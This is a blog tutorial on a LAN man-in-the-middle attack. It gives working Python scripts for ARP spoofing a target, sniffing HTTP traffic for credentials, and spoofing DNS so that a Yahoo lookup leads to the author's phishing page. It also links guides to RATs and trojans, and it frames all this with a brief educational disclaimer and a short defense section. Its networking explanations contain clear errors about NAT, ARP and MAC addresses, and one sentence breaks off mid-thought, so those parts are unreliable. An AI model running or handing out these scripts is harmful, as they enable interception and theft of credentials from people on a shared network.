---
title: Man in the middle attack
author: hugo
date: 2023-05-05 09:11:00 +0200
categories: [Tutorial, security]
tags: [hacking, python, spoofing, MiM]
render_with_liquid: false
---


> This tutorial will guide you through the process of compromising and phishing a computer in your LAN. The author gives this example for educational purposes and does not incentivise you to apply these techniques without prior consent
{: .prompt-info }

If you ever took any interest in penetration testing you probably heard of the tv series Mr Robot. Elliot, the main protagonist, is a morphine junkie that hacks into his hospital's network to tamper with his blood tests and hide his drug use. On the first episode of the series Elliot hacks into Ron, the owner of the coffee shop, and confronts him about his pedophile website on the Tor network. 

At first Ron, the shop owner, assumes it's blackmail and that Elliot is in it for the money but he won't believe what is about to happen to him. Just like in the 4 stages of grief, Ron starts by denying the facts followed by anger which then leads to catharsis and ends up trying to bargain his way out of it. Later in the series he plugs a raspberry pi into the HVAC system which allowed him to install a reverse shell and compromise the database by encrypting the data.

These exploits greatly inspired me to take a deep dive into this world of social engineers, penetration tests and malware. The video below is an extract of his confrontation with Ron

<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">
<iframe width="100%" height="400px" src="https://youtube.craftstudios.shop/uploads/netgear/Videos/chirpy/Elliot%20Hacks%20A%20Pedophile%20Mr.%20Robot.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>

Getting a foothold into a network is one of the first steps in compromising your target. I've written a blog post that explains how to do deploy those on Android and linux systems [here](https://chirpy.craftstudios.shop/posts/trying-out-an-android-rat/) and [here](https://chirpy.craftstudios.shop/posts/installing-a-trojan-on-linux/)

In this article I will go through one of the ways you can intercept traffic and spoof DNS queries to phish for credentials. The conclusion will focus on how to prevent this type of attack. Ready? Let's begin. 

This tutorial is split in three parts:

1. Step 1 ARP spoofing: setting yourself in the middle 
2. Step 2 Sniff packets
3. Step 3 Spoof DNS requests


## Step 1 of 3: ARP spoofing
Before talking about Address Resolution Protocol (ARP) we need to understand how our devices at home communicate with the internet.  

All of our devices exchange data with a server in order to access a specific website or "Like" that post on Instagram. Now the thing is internet service providers (ISPs) cannot issue a new IP address every time a new tablet joins your network. The IPv4 standard only supports 4.294.967.296 unique addresses. Even though this looks like a large number, ISPs treat it like a rare resource and won't issue a public static IP to every device. Judging by the fact Apple says there are 1 billion You can call up your ISP to get one but it will cost you hard earned cash and is usually reserved to businesses who want to set up their own mail service. 
So we know that IPv4 addresses are rare and that they cost extra, so how am I able to visit websites? ISPs have tackled this problem by assigning dynamic IPs which means that the address will change once you reboot your gateway/router or simply unplug it for a second. Re-assigning unused addresses helps ISPs deal with the shortage of addresses in a cost effective manner by continuously redistributing IPs. But you might say: "That's all fine and dandy Hugo but if the ISP only provides 1 dynamic IP to our router how come I can browse the internet on two or more devices at the same time?"  
I'm glad you asked. Routers nowadays use something called network address translation (NAT) to create fake virtual network adapters on your devices. A network device is networking hardware that communicates with your device's kernel which is like the heart of your operating system. By creating a local area network routers assign local IP addresses to all of your devices. This ensures that the instagram page you're visiting actually ends up in the tablet that you requested and not your PC.

So now that you know how your device communicates with servers on the internet let's dive into ARP.

Manufacturers print a MAC address into every device so that they know where it came from and control what you do with it. For instance if you try to connect your iPhone into a PCI express card that is not manufactured by Apple it won't work because the manufacturer deliberately wants you to use Apple hardware. In case you want to install the macOS onto non-approved hardware it will be exactly the same problem. Today there are solutions to both these problems thankfully. For installing macOS on linux I've used virt-manager (which uses qemu and kvm in the background) and [sosumi](https://github.com/popey/sosumi-snap). Sosumi builds the .qcow2 file which is like the operating system's image that you can then import into virt-manager. I like virt-manager a lot because it allows you to easily configure everything from the GUI. Regarding our second problem we could create a proxy that does a kind of USB to ethernet passthrough but i did not try it yet. [Virtualhere](https://www.virtualhere.com/usb_client_software) seems to fit work so I might try it in the future.

So now that we know what a MAC address let's talk about ARP. ARP or Address Resolution Protocol is the way routers assign IP addresses for a specific MAC on the local network. If we take map analogy, the MAC is the gps coordinate and the IP is your house's street and number. The GPS coordinate of your house is an intrinsic feature of your house and won't change whereas the street number could change if your local administration decides to ditch the lettering system on your appartment with a numbering system instead.

I did a long introduction to make sure everyone reading this is at the same knowledge level and can understand the exploit i'm about to share with you. It might sounds silly what i'm about to say but ARP spoofing is as easy as spamming the router telling him you have your target's MAC address while at the same time spamming the target with ARP packets informing him that you hold the router's MAC address and that all internet communication should flow through you. It's that simple. You can then confirm that the exploit worked by running a command and confirming that the IP address changed

```console
    waz@localhost:$ apt install libnetfilter-queue-dev
    waz@localhost:$ virtualenv env 
    waz@localhost:$ source env/bin/activate
    waz@localhost:$ pip install scapy==2.4.2 NetfilterQueue==1.1.0 load_dotenv
    waz@localhost:$ python
    Python 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> 
```

Now that the environment is set up use the code below and replace your target's and gateway's IP

```python

#!/usr/bin/python

import time
import scapy.all as scapy

def get_mac_address(ip):
    if not ip:
        print("No input given. Exiting program")
        exit()
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return answered_list[0][1].hwsrc
    except IndexError:
        print("Index out of bound exception found")


def restore(source_ip, destination_ip):
    source_mac = get_mac_address(source_ip)
    destination_mac = get_mac_address(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


if __name__ == "__main__":

    target_ip = "REPLACE_WITH_YOUR_IP"
    gateway_ip = "REPLACE_WITH_YOUR_IP"
    packet_counter = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packet_counter = packet_counter + 2
            print("\rNumber of packets sent are " + str(packet_counter), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nExiting program and restoring IP")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("Restoring done!")

```

Run the following command on your target to verify that the traffic is now flowing through your computer

```console
    waz@localhost:$ arp -a
```

If this operation results in your target having no internet please make sure to change your ip tables to allow packet forwarding. You can verify that it is disabled first and then run the command to temporarily allow forwarding

```console
    waz@localhost:$ cat /proc/sys/net/ipv4/ip_forward
    0
    waz@localhost:$ sudo su
    waz@localhost:$ sysctl -w net.ipv4.ip_forward=1
    waz@localhost:$ exit
    waz@localhost:$ cat /proc/sys/net/ipv4/ip_forward
    1
```

## Step 2 of 3: Sniff packets

So now what? We have done the hardest part already. Now let's watch the traffic. If the target is visiting pages with TLS enabled you won't see any credentials or anything resembling html but we can watch the URLs and monitor the traffic.

In order to do that replace the network's interface in the code below

Run the following command on linux to know your network card's name. Mine is eno1:

```console
    waz@localhost:$ ip addr
    eno1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.X.X  netmask 255.255.255.0  broadcast 192.168.X.X
            inet6 fe80::b5ef:afde:94d0:8969  prefixlen 64  scopeid 0x20<link>
            ether 50:e5:50:h5:k8:e1  txqueuelen 1000  (Ethernet)
            RX packets 94681718  bytes 86957151306 (86.9 GB)
            RX errors 0  dropped 40164  overruns 0  frame 0
            TX packets 70522216  bytes 77756706360 (77.7 GB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
            device interrupt 20  memory 0xfb600000-fb620000
```


```python
#!/usr/bin/env python

import scapy.all as scapy
import scapy_http.http as http


def get_url(packet):
    return str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)


def get_user_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "email", "pass", "password", "pwd", "usr", "user", "login"]
        for keyword in keywords:
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request URL " + url)

        user_credentials = get_user_credentials(packet)
        if user_credentials:
            print("\n\n[+] Possible user credentials are -> " + str(user_credentials) + "\n\n")


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


sniffer("REPLACE_WITH_YOUR_NIC")
```

## Step 3 of 3: Spoof DNS requests

Our final step will be to serve the [custom phishing page](https://chirpy.craftstudios.shop/posts/a-simple-phishing-page/) that I shared a couple of weeks ago. Instead of going to the actual yahoo page the user is served a fake login page at www.yahoo.com that captures credentials and then redirects to the actual website

The implementation below can seem daunting at first but if you understand the idea it becomes easier to read the code. If you don't know how socket programming works bear with me. 

So our task is to replace our tablet's DNS request with ours except it's not as easy as deleting or filtering the existing one. If you do that the socket will close the connection. The workaround is to stall the original DNS request into a "netfilterqueue" queue. This delay allows us to create our own DNS request and get a faster round trip to the yahoo servers thus ensuring our spoofed request gets passed to the tablet instead of the original one.


```python

import netfilterqueue
import scapy.all as scapy
import os
from dotenv import load_dotenv


load_dotenv()
QUEUE_ID = os.getenv("QUEUE_ID")
URL_TO_SPOOF = os.getenv("URL_TO_SPOOF")
REDIRECT_IP = os.getenv("REDIRECT_IP")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    # filter DNS response requests
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if URL_TO_SPOOF in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=URL_TO_SPOOF, rdata=REDIRECT_IP)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()

if __name__ == '__main__':

    os.system("sudo iptables --flush")
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_ID))
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(QUEUE_ID), process_packet)

    try:
        while True:
            queue.run()
    except KeyboardInterrupt:
        print("\n[-] Exiting program")

```
## Video

<div style="padding-top: 5px; padding-bottom: 5px; position:relative; display:block; width: 100%; min-height:400px">
<iframe width="100%" height="400px" src="https://youtube.craftstudios.shop/uploads/netgear/Videos/chirpy/dns%20spoof2.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
</div>

## Conclusion
This attack can be easily thwarted by either using modern browsers that verify the TLS certificates and detect this type of attack or by modifying your ip_tables to lock down your ARP table. Example below for the linux implementation:


```console
    waz@localhost:$ arp -s 192.168.0.65 00:50:ba:85:85:ca
```
I found some interesting CISCO router configuration as well that allows us to lock down your gateway's MAC address [here](https://www.freeccnaworkbook.com/workbooks/ccna/configuring-a-static-arp-entry)


Thanks for reading this far

See you in the next one